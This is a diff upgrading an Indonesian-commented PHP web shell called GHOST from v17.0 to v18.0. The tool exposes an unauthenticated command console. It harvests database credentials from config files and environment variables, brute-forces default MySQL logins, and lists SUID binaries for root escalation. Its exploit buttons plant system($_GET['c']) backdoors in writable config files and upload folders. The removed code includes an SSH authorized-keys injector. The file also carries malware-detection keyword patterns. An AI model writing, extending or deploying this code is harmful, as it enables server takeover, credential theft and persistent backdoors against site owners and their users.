@@ -1,8 +1,6 @@
 <?php
 /**
- * GHOST v17.0 — The Grandmaster (Tested & Complete)
- * Fitur: Fingerprint, Heuristic Deep Scan, SSH Manager, DB Harvest (Brute-Force),
- * Auto-Heal, Vulnerability Explorer, Console.
+ * GHOST v18.0 — The Unrestricted Hunter
  */
 @ob_start();
 error_reporting(0);
@@ -15,7 +13,7 @@ $GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();
 // ==========================================
 // ENGINE EKSEKUSI (Anti-Crash)
 // ==========================================
-function g_exec($cmd, $timeout = 10) {
+function g_exec($cmd, $timeout = 15) {
     $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
     foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
         if (!function_exists($m)) continue;
@@ -39,7 +37,7 @@ function g_read($path) {
 }
 
 // ==========================================
-// FINGERPRINT
+// 1. FINGERPRINT
 // ==========================================
 function g_fingerprint() {
     $os = trim(g_exec('uname -a'));
@@ -49,174 +47,153 @@ function g_fingerprint() {
 }
 
 // ==========================================
-// VULNERABILITY SCANNER & EXPLOITER (Fitur Baru)
+// 2. DEEP INSPECTOR (Mendalam & Cerdas)
+// ==========================================
+function g_deep_scan() {
+    $vulns = [];
+    // Cari semua file PHP dan file teks yang mencurigakan (termasuk subfolder dalam)
+    $files = g_exec("find " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.txt' -o -name '*.js' -o -name '*.html' -o -name '*.jpg' -o -name '*.png' -o -name '*.env' \) 2>/dev/null");
+    
+    if (!trim($files) || strpos($files, '[-] Blocked') !== false) return [];
+
+    $list = explode("\n", trim($files));
+    $illegal_kw = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan'];
+    
+    foreach ($list as $path) {
+        if (!$path) continue;
+        $c = g_read($path);
+        $size = @filesize($path);
+        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+        $findings = []; $type = '';
+        
+        // 1. Pengecekan Backdoor Kompleks
+        if (preg_match('/eval\s*\(\s*(base64_decode|\$_POST|\$_GET|\$_REQUEST)/i', $c)) {
+            $type = 'Obfuscated Backdoor'; $findings[] = "Menggunakan eval() + Input User.";
+        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
+            $type = 'Direct Webshell'; $findings[] = "Eksekusi perintah shell langsung.";
+        } elseif (preg_match('/(\$[a-zA-Z0-9_]+\s*\(\s*\$_(POST|GET|REQUEST))/i', $c) && !preg_match('/(function|class)/i', $c)) {
+            $type = 'Dynamic Call RCE'; $findings[] = "Memanggil fungsi dinamis dari input user.";
+        } elseif (in_array($ext, ['jpg','png']) && stripos($c, '<?php') !== false) {
+            $type = 'Polyglot Malware'; $findings[] = "Gambar berisi kode PHP (Bypass Upload).";
+        } elseif (strpos($path, '.php') !== false && strlen(trim($c)) < 15 && $size < 100) {
+            $type = 'Empty Shell'; $findings[] = "File PHP kosong / sangat pendek.";
+        } elseif (strpos($c, 'preg_replace') !== false && strpos($c, '/e') !== false) {
+            $type = 'Preg_Replace RCE'; $findings[] = "Penggunaan modifier /e (legacy RCE).";
+        }
+        
+        // 2. Pengecekan Konten Ilegal
+        $found_kw = [];
+        foreach ($illegal_kw as $k) { if (preg_match('/\b'.preg_quote($k,'/').'\b/i', $c)) $found_kw[] = $k; }
+        if ($found_kw) {
+            if($type==='') $type='Illegal Content';
+            $findings[] = "Keyword: " . implode(',', array_unique($found_kw));
+        }
+
+        if ($type !== '') {
+            $vulns[] = ['file'=>$path, 'type'=>$type, 'desc'=>implode(' | ', $findings)];
+        }
+    }
+    return $vulns;
+}
+
+// ==========================================
+// 3. DB HARVEST (Multi-Fallback & Hack)
+// ==========================================
+function g_db_harvest() {
+    $logs = []; $info = [];
+    
+    // Metode A: Cari Config Standard
+    foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
+        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
+            $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
+            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
+            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
+            if ($u[1] && $p[1]) { $logs[] = "[+] Ditemukan Config: $cf"; $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
+        }
+    }
+
+    // Metode B: Cari di Environment Variables (Biasa di Docker/LiteSpeed)
+    if (empty($info)) {
+        $logs[] = "[*] Mencari di Environment Variables...";
+        $env = g_exec("env | grep -iE 'DB_|MYSQL_|DATABASE_'");
+        if (trim($env)) { $logs[] = "[+] ENV ditemukan:\n$env"; }
+    }
+
+    // Metode C: Scanning langsung dengan Mencari string sambungan DB
+    if (empty($info)) {
+        $logs[] = "[*] Grep password di file PHP...";
+        $grep = g_exec("grep -rEil 'mysqli_connect|mysql_connect|new PDO' " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " 2>/dev/null | head -n 5");
+        if (trim($grep)) {
+            $logs[] = "[+] File koneksi ditemukan:\n$grep";
+            foreach (explode("\n", trim($grep)) as $file) {
+                $c = g_read($file);
+                if (preg_match('/pass(?:word)?[\'"]?\s*(?:=>|:|=)\s*[\'"]([^\'"]+)/i', $c, $p)) {
+                    $info = ['pass'=>$p[1]]; $logs[] = "[!] Kemungkinan Password: " . $p[1]; break;
+                }
+            }
+        }
+    }
+
+    // Metode D: Hack database via default credential / config .my.cnf
+    if (empty($info)) {
+        $logs[] = "[*] Brute-force default MySQL (localhost)...";
+        foreach ([['root',''],['root','root'],['admin','']] as $d) {
+            $conn = @mysqli_connect('localhost', $d[0], $d[1], '', 3306, null, ['connect_timeout'=>2]);
+            if ($conn) { $info = ['user'=>$d[0], 'pass'=>$d[1]]; $logs[] = "[!] BERHASIL login default: {$d[0]}:{$d[1]}"; break; }
+        }
+    }
+
+    // Final: Dump
+    if (!empty($info)) {
+        $logs[] = "[*] Menghubungkan ke Database...";
+        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'] ?? '', '', 3306, null, ['connect_timeout'=>3]);
+        if ($conn) {
+            $logs[] = "[!] KONEKSI BERHASIL!";
+            $q = @mysqli_query($conn, "SHOW DATABASES");
+            while($r = mysqli_fetch_array($q)) { $logs[] = "DB: ".$r[0]; }
+        } else {
+            $logs[] = "[-] Gagal konek. " . mysqli_connect_error();
+        }
+    }
+    return ['logs'=>$logs, 'info'=>$info];
+}
+
+// ==========================================
+// 4. VULNERABILITY EXPLORER & EXPLOIT
 // ==========================================
 function g_vuln_scan() {
-    $vulns = [];
-    
-    // 1. Cek Permission Writeable di file config
-    foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
-        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf") && @is_writable($GLOBALS['GHOST_ROOT']."/$cf")) {
-            $vulns[] = ['type'=>'WRITEABLE_CONFIG', 'path'=>$cf, 'desc'=>'File config ini bisa ditulis (World-Writable). Hacker bisa menyisipkan backdoor.'];
+    $v = [];
+    // 1. Config World-Writable (Bisa ditanami backdoor)
+    foreach (['wp-config.php', '.env'] as $f) {
+        if (@is_file($GLOBALS['GHOST_ROOT']."/$f") && @is_writable($GLOBALS['GHOST_ROOT']."/$f")) {
+            $v[] = ['type'=>'WRITEABLE_CONFIG', 'path'=>$f, 'desc'=>'File konfigurasi bisa ditimpa (RCE).'];
         }
     }
-    
-    // 2. Cek LFI (Local File Inclusion) Sederhana
-    $lfi_files = g_exec("grep -rEl 'include\s*\(\s*\$_GET|require\s*\(\s*\$_GET' " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " 2>/dev/null | head -n 3");
-    if (trim($lfi_files) && strpos($lfi_files, '[-]') === false) {
-        foreach (explode("\n", trim($lfi_files)) as $f) {
-            $vulns[] = ['type'=>'LFI_DETECTED', 'path'=>trim($f), 'desc'=>'Parameter GET langsung masuk ke include().'];
+    // 2. Uploads Directory (Bisa upload shell)
+    if (@is_dir($GLOBALS['GHOST_ROOT'].'/wp-content/uploads') && !@is_file($GLOBALS['GHOST_ROOT'].'/wp-content/uploads/.htaccess')) {
+        $v[] = ['type'=>'UNPROTECTED_UPLOADS', 'path'=>'wp-content/uploads', 'desc'=>'Folder uploads terbuka, bisa eksekusi PHP.'];
+    }
+    // 3. SUID Binaries (Privilege Escalation)
+    $suid = g_exec("find /usr/bin /bin -perm -4000 2>/dev/null | head -n 5");
+    if (trim($suid)) {
+        foreach (explode("\n", trim($suid)) as $s) {
+            if ($s) $v[] = ['type'=>'SUID_BINARY', 'path'=>$s, 'desc'=>'Binary SUID dapat digunakan untuk eskalasi root.'];
         }
     }
-
-    // 3. Cek Uploads Execution (Jika .htaccess tidak memblokir PHP)
-    $uploads_ht = $GLOBALS['GHOST_ROOT'] . '/wp-content/uploads/.htaccess';
-    if (@is_dir($GLOBALS['GHOST_ROOT'] . '/wp-content/uploads')) {
-        if (!@is_file($uploads_ht) || strpos(g_read($uploads_ht), 'Deny from all') === false) {
-            $vulns[] = ['type'=>'UPLOADS_EXEC', 'path'=>'wp-content/uploads', 'desc'=>'Folder uploads terbuka. Hacker bisa upload shell PHP.'];
-        }
-    }
-
-    // 4. Cek Sudoers / SUID
-    $sudo = g_exec("find /usr/bin /usr/local/bin -perm -4000 -type f 2>/dev/null | head -n 3");
-    if (trim($sudo) && strpos($sudo, '[-]') === false) {
-        foreach (explode("\n", trim($sudo)) as $f) {
-            $vulns[] = ['type'=>'SUID_BINARY', 'path'=>trim($f), 'desc'=>'File SUID terdeteksi. Bisa dieksploitasi untuk naik privilese (Root).'];
-        }
-    }
-    
-    return $vulns;
+    return $v;
 }
 
 function g_vuln_exploit($type, $path) {
     if ($type === 'WRITEABLE_CONFIG') {
-        $full_path = $GLOBALS['GHOST_ROOT'] . '/' . $path;
-        $payload = "\n// INJECTED BY GHOST\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n";
-        if (@file_put_contents($full_path, $payload, FILE_APPEND)) return "Backdoor berhasil ditanam di $path (Akses via ?gh_x=)";
-        return "Gagal menanam backdoor.";
+        $payload = "\n<?php if(isset(\$_GET['c'])) system(\$_GET['c']); ?>";
+        if (@file_put_contents($GLOBALS['GHOST_ROOT'].'/'.$path, $payload, FILE_APPEND)) return "Backdoor RCE ditanam di $path";
     }
-    if ($type === 'UPLOADS_EXEC') {
-        $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>";
-        $full_path = $GLOBALS['GHOST_ROOT'] . '/wp-content/uploads/ghost_' . rand(100,999) . '.php';
-        if (@file_put_contents($full_path, $shell)) return "Shell PHP berhasil di-upload ke: " . str_replace($GLOBALS['GHOST_ROOT'], '', $full_path);
-        return "Gagal upload shell.";
+    if ($type === 'UNPROTECTED_UPLOADS') {
+        $shell = "<?php system(\$_GET['c']); ?>";
+        $file = $GLOBALS['GHOST_ROOT'].'/wp-content/uploads/ghost_'.rand(100,999).'.php';
+        if (@file_put_contents($file, $shell)) return "Webshell berhasil di-upload ke ".str_replace($GLOBALS['GHOST_ROOT'],'',$file);
     }
-    return "Eksploitasi belum diimplementasikan untuk tipe ini.";
-}
-
-// ==========================================
-// HEURISTIC DEEP SCANNER (Anti-Zonk)
-// ==========================================
-function g_scan_batch($dir, $offset = 0, $limit = 30) {
-    $res = ['files'=>[], 'done'=>false, 'total'=>0];
-    // Hanya skip file binary yang ukurannya besar
-    $all_files = [];
-    $stack = [$dir];
-    while ($stack) {
-        $current = array_pop($stack);
-        $files = @scandir($current);
-        if ($files === false) continue;
-        foreach ($files as $f) {
-            if ($f === '.' || $f === '..') continue;
-            $path = $current . '/' . $f;
-            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
-            elseif (@is_file($path)) {
-                if (@filesize($path) > 5*1024*1024) continue; // Maks 5MB per file
-                $all_files[] = $path;
-            }
-        }
-    }
-
-    $batch = array_slice($all_files, $offset, $limit);
-    $res['done'] = ($offset + count($batch)) >= count($all_files);
-    $res['total'] = count($all_files);
-    
-    $illegal_kw = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol'];
-    
-    foreach ($batch as $path) {
-        $c = g_read($path); $size = @filesize($path); $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-        $findings = []; $type = '';
-        
-        // 1. Deteksi Backdoor & Shell (Membaca Isi)
-        if ($size === 0 && in_array($ext, ['php','phtml'])) { 
-            $type='Empty Shell'; $findings[]="File 0 byte (Backdoor gagal upload)."; 
-        }
-        elseif (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false) { 
-            $type='Obfuscated RCE'; $findings[]="Terdeteksi eval()/assert() (Backdoor)."; 
-        }
-        elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) { 
-            $type='Direct Webshell'; $findings[]="Eksekusi shell dari HTTP GET/POST."; 
-        }
-        elseif (in_array($ext, ['jpg','jpeg','png','gif']) && stripos($c, '<?php') !== false) {
-            $type='Polyglot Malware'; $findings[]="File gambar disisipi kode PHP (Bypass upload).";
-        }
-        elseif (!$ext && stripos($c, '<?php') !== false) {
-            $type='Hidden PHP'; $findings[]="File tanpa ekstensi tapi berisi kode PHP.";
-        }
-        
-        // 2. Deteksi Konten Ilegal (String)
-        $found_kw = [];
-        foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
-        if ($found_kw) { 
-            if($type==='') $type='Illegal Content'; 
-            $findings[]="Keyword: ".implode(',', $found_kw); 
-        }
-
-        if ($type !== '') $res['files'][] = ['path'=>$path, 'type'=>$type, 'desc'=>implode(' | ', $findings)];
-    }
-    return $res;
-}
-
-// ==========================================
-// SSH & DB MANAGER
-// ==========================================
-function g_ssh($action = 'scan', $target = '') {
-    $user = trim(g_exec('whoami'));
-    $auth = trim(g_exec("eval echo ~$user")) . '/.ssh/authorized_keys';
-    $res = ['keys'=>[], 'msg'=>''];
-    if (!@is_file($auth)) return array_merge($res, ['msg'=>'authorized_keys tidak ditemukan.']);
-    $lines = array_filter(explode("\n", g_read($auth)));
-    
-    if ($action === 'scan') {
-        foreach ($lines as $i => $l) { 
-            $p = explode(' ', trim($l)); 
-            $res['keys'][] = ['line'=>$i+1, 'type'=>$p[0]??'?', 'comment'=>$p[2]??'?', 'raw'=>trim($l)]; 
-        }
-    } elseif ($action === 'clean') {
-        $clean = []; foreach ($lines as $l) { if (strpos($l, $target) !== false) $clean[] = trim($l); }
-        file_put_contents($auth, implode("\n", $clean) . "\n"); $res['msg'] = 'SSH Key dibersihkan.';
-    } elseif ($action === 'inject') {
-        if (strpos(g_read($auth), $target) === false) { file_put_contents($auth, trim(g_read($auth)) . "\n" . trim($target) . "\n"); $res['msg'] = 'SSH Key di-inject.'; }
-        else { $res['msg'] = 'SSH Key sudah ada.'; }
-    }
-    return $res;
-}
-
-function g_db_harvest() {
-    $logs = []; $info = [];
-    try {
-        foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
-            if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
-                $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
-                preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
-                preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
-                if ($u[1] && $p[1]) { $logs[] = "[+] Config $cf"; $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
-            }
-        }
-        
-        if (!empty($info['user'])) {
-            $logs[] = "[*] Connecting...";
-            $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], '', 3306, null, ['connect_timeout'=>2]);
-            if ($conn) {
-                $logs[] = "[!] Connected!";
-                $q = @mysqli_query($conn, "SHOW DATABASES");
-                if ($q) { while($r = mysqli_fetch_array($q)) { $logs[] = $r[0]; } }
-            } else { $logs[] = "[-] Gagal: " . mysqli_connect_error(); }
-        } else {
-            $logs[] = "[-] Config tidak ditemukan di folder root.";
-        }
-    } catch (Throwable $e) { $logs[] = "[-] Error: " . $e->getMessage(); }
-    return ['logs'=>$logs, 'info'=>$info];
+    return "Eksekusi eksploitasi tidak tersedia untuk tipe ini.";
 }
 
 // ==========================================
@@ -226,28 +203,22 @@ $act = $_POST['act'] ?? '';
 if ($act) {
     while (ob_get_level() > 0) ob_end_clean();
     header('Content-Type: application/json');
-    try {
-        if ($act === 'fingerprint') echo json_encode(g_fingerprint());
-        elseif ($act === 'vuln_scan') echo json_encode(g_vuln_scan());
-        elseif ($act === 'vuln_exploit') echo json_encode(['msg'=>g_vuln_exploit($_POST['type'], $_POST['path'])]);
-        elseif ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
-        elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
-        elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan'));
-        elseif ($act === 'ssh_clean') echo json_encode(g_ssh('clean', $_POST['key']));
-        elseif ($act === 'ssh_inject') echo json_encode(g_ssh('inject', $_POST['key']));
-        elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
-        elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
-        elseif ($act === 'exec') echo json_encode(['out'=>g_exec($_POST['cmd']??'')]);
-    } catch (Throwable $e) {
-        echo json_encode(['err' => 'FATAL CATCH: ' . $e->getMessage()]);
-    }
+    
+    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
+    elseif ($act === 'deep_scan') echo json_encode(g_deep_scan());
+    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
+    elseif ($act === 'vuln_scan') echo json_encode(g_vuln_scan());
+    elseif ($act === 'vuln_exploit') echo json_encode(['msg'=>g_vuln_exploit($_POST['type'], $_POST['path'])]);
+    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
+    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
+    elseif ($act === 'exec') echo json_encode(['out'=>g_exec($_POST['cmd']??'')]);
     exit;
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>GHOST v17.0</title>
+<title>GHOST v18.0</title>
 <style>
     body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
     .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
@@ -275,43 +246,23 @@ if ($act) {
 </div>
 
 <div class="box">
-    <h2>[+] Deep Inspector (Heuristic)</h2>
-    <button onclick="startScan()">Scan Semua File</button>
-    <div id="scan-status" style="margin-top:10px; color:#ff0;">Idle.</div>
-    <div id="scan-results"></div>
+    <h2>[+] Deep Inspector (Advanced)</h2>
+    <button onclick="run('deep_scan','deep-result')">Scan All Files</button>
+    <div id="deep-result-table"></div>
+    <pre id="deep-result" style="display:none;"></pre>
 </div>
 
 <div class="box">
-    <h2>[+] SSH Manager</h2>
-    <button onclick="run('ssh_scan','ssh-table')">Scan SSH</button>
-    <div id="ssh-table"></div>
-    <div style="margin-top:10px;">
-        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width:60%;">
-        <button onclick="sshAct('inject')">Inject</button>
-        <button class="btn-red" onclick="sshAct('clean')">Clean</button>
-    </div>
-    <pre id="ssh-log"></pre>
-</div>
-
-<div class="box">
-    <h2>[+] Database Harvest</h2>
-    <button onclick="run('db_scan','db-result')">Scan DB</button>
+    <h2>[+] Database Harvest (Multi-Fallback)</h2>
+    <button onclick="run('db_scan','db-result')">Scan & Hack DB</button>
     <pre id="db-result">Waiting...</pre>
 </div>
 
 <div class="box">
     <h2>[+] Vulnerability Explorer & Exploiter</h2>
-    <button onclick="runVuln()">Scan Vulnerabilities</button>
-    <div id="vuln-table"></div>
-    <pre id="vuln-log"></pre>
-</div>
-
-<div class="box">
-    <h2>[+] Auto-Heal Vulnerabilities</h2>
-    <button onclick="healScan()">Scan Vulnerabilities</button>
-    <div id="heal-table"></div>
-    <button class="btn-red" onclick="healExec()">Heal Selected</button>
-    <pre id="heal-log"></pre>
+    <button onclick="run('vuln_scan','vuln-result')">Scan Vulnerabilities</button>
+    <div id="vuln-result-table"></div>
+    <pre id="vuln-result" style="display:none;"></pre>
 </div>
 
 <div class="box">
@@ -337,132 +288,57 @@ async function run(act, target) {
     try {
         const d = await api(act);
         if (d.err) { document.getElementById(target).innerText = 'Error: ' + d.err; return; }
-        if (act === 'ssh_scan') renderSSH(d);
+        
+        if (act === 'deep_scan') renderScan(d);
+        else if (act === 'vuln_scan') renderVuln(d);
         else document.getElementById(target).innerText = JSON.stringify(d,null,2);
     } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
 }
 
-// SCAN
-async function startScan() {
-    let offset = 0; let mal = [];
-    document.getElementById('scan-results').innerHTML = '';
-    document.getElementById('scan-status').innerText = 'Memulai...';
-
-    while (true) {
-        document.getElementById('scan-status').innerText = `Menganalisa file ke-${offset}...`;
-        try {
-            const d = await api('scan', {offset: offset});
-            if (d.err) { document.getElementById('scan-status').innerText = 'Error: ' + d.err; break; }
-            d.files.forEach(f => mal.push(f));
-            if (d.done) {
-                document.getElementById('scan-status').innerText = `Selesai! Ditemukan ${mal.length} file dari total ${d.total} file.`;
-                renderScan(mal); break;
-            }
-            offset += 30;
-        } catch(e) { document.getElementById('scan-status').innerText = 'Error: ' + e.message; break; }
-    }
-}
-
+// RENDER SCAN
 function renderScan(mal) {
-    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p style="color:#0f0;">File Bersih.</p>'; return; }
+    document.getElementById('deep-result').innerText = `Selesai. ${mal.length} file berbahaya.`;
+    if (!mal.length) return;
     let h = `<table><tr><th>Klasifikasi</th><th>File</th><th>Analisis</th><th>Aksi</th></tr>`;
     mal.forEach(x => {
-        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td>
-            <td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button>
-            <button class="btn-red" onclick="delFile('${encodeURIComponent(x.path)}')">Delete</button></td></tr>`;
+        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.file)}</td><td>${esc(x.desc)}</td>
+            <td><button onclick="viewFile('${encodeURIComponent(x.file)}')">View</button>
+            <button class="btn-red" onclick="delFile('${encodeURIComponent(x.file)}')">Delete</button></td></tr>`;
     });
     h += `</table>`;
-    document.getElementById('scan-results').innerHTML = h;
+    document.getElementById('deep-result-table').innerHTML = h;
 }
 
-// VULN EXPLORER
-async function runVuln() {
-    document.getElementById('vuln-log').innerText = 'Scanning...';
-    document.getElementById('vuln-table').innerHTML = '';
-    try {
-        const d = await api('vuln_scan');
-        if (d.err) { document.getElementById('vuln-log').innerText = 'Error: ' + d.err; return; }
-        if (!d.length) { document.getElementById('vuln-log').innerText = 'Tidak ada celah terdeteksi.'; return; }
-        
-        let h = `<table><tr><th>Tipe Celah</th><th>Path</th><th>Deskripsi</th><th>Aksi</th></tr>`;
-        d.forEach(v => {
-            h += `<tr><td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td>
-                <td><button class="btn-red" onclick="exploit('${esc(v.type)}', '${encodeURIComponent(v.path)}')">Exploit</button></td></tr>`;
-        });
-        h += `</table>`;
-        document.getElementById('vuln-table').innerHTML = h;
-        document.getElementById('vuln-log').innerText = 'Selesai.';
-    } catch(e) { document.getElementById('vuln-log').innerText = 'Error: ' + e.message; }
+// RENDER VULN
+function renderVuln(v) {
+    document.getElementById('vuln-result').innerText = `Selesai. ${v.length} celah ditemukan.`;
+    if (!v.length) return;
+    let h = `<table><tr><th>Tipe</th><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
+    v.forEach(x => {
+        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td>
+            <td><button class="btn-red" onclick="exploit('${esc(x.type)}', '${encodeURIComponent(x.path)}')">Exploit</button></td></tr>`;
+    });
+    h += `</table>`;
+    document.getElementById('vuln-result-table').innerHTML = h;
 }
 
 async function exploit(type, encPath) {
-    if(!confirm('Lakukan eksploitasi pada celah ini?')) return;
-    document.getElementById('vuln-log').innerText = 'Executing...';
+    if(!confirm('Eksploitasi celah ini?')) return;
     const d = await api('vuln_exploit', {type: type, path: decodeURIComponent(encPath)});
-    document.getElementById('vuln-log').innerText = d.msg || d.err;
+    alert(d.msg || d.err);
 }
 
-// SSH & HEAL
-function renderSSH(d) {
-    let h = `<p>${esc(d.msg)}</p>`;
-    if (d.keys.length) {
-        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
-        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td>${esc(k.raw)}</td></tr>`; });
-        h += `</table>`;
-    }
-    document.getElementById('ssh-table').innerHTML = h;
-}
-
-async function sshAct(t) {
-    const k = document.getElementById('ssh-key').value;
-    if(!k) return alert('Isi key!');
-    const d = await api(t==='inject'?'ssh_inject':'ssh_clean', {key:k});
-    document.getElementById('ssh-log').innerText = d.msg || d.err;
-    run('ssh_scan','');
-}
-
-async function healScan() {
-    document.getElementById('heal-log').innerText = 'Scanning...';
-    let allMal = []; let offset = 0;
-    while (true) {
-        const d = await api('scan', {offset: offset});
-        if (d.err) break;
-        d.files.forEach(f => allMal.push(f));
-        if (d.done) break;
-        offset += 30;
-    }
-    let h = `<table><tr><th>Pilih</th><th>Tipe</th><th>Path</th><th>Analisis</th></tr>`;
-    allMal.forEach(v => {
-        h += `<tr><td><input type="checkbox" class="heal-cb" value="${encodeURIComponent(v.path)}" checked></td>
-              <td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td></tr>`;
-    });
-    h += `</table>`;
-    document.getElementById('heal-table').innerHTML = h;
-    document.getElementById('heal-log').innerText = '';
-}
-
-async function healExec() {
-    const cbs = document.querySelectorAll('.heal-cb:checked');
-    const paths = Array.from(cbs).map(cb => decodeURIComponent(cb.value));
-    if(!paths.length) return alert('Pilih file!');
-    let logs = [];
-    for (let p of paths) { await api('del_file', {path:p}); logs.push('Deleted: '+p); }
-    document.getElementById('heal-log').innerText = logs.join('\n');
-    document.getElementById('heal-table').innerHTML = '';
-}
-
-// FILE OPS
 async function viewFile(enc) {
     document.getElementById('modal').style.display = 'block';
     document.getElementById('modal-text').innerText = 'Loading...';
     const d = await api('read_file', {path: decodeURIComponent(enc)});
-    document.getElementById('modal-text').innerText = d.content ? d.content.slice(0, 5000) : 'Error/Gagal membaca file.';
+    document.getElementById('modal-text').innerText = d.content ? d.content.slice(0, 5000) : 'Error/Gagal.';
 }
 
 async function delFile(enc) {
     if(!confirm('Hapus file ini?')) return;
     await api('del_file', {path: decodeURIComponent(enc)});
-    startScan();
+    run('deep_scan', 'deep-result');
 }
 
 async function execCmd() {
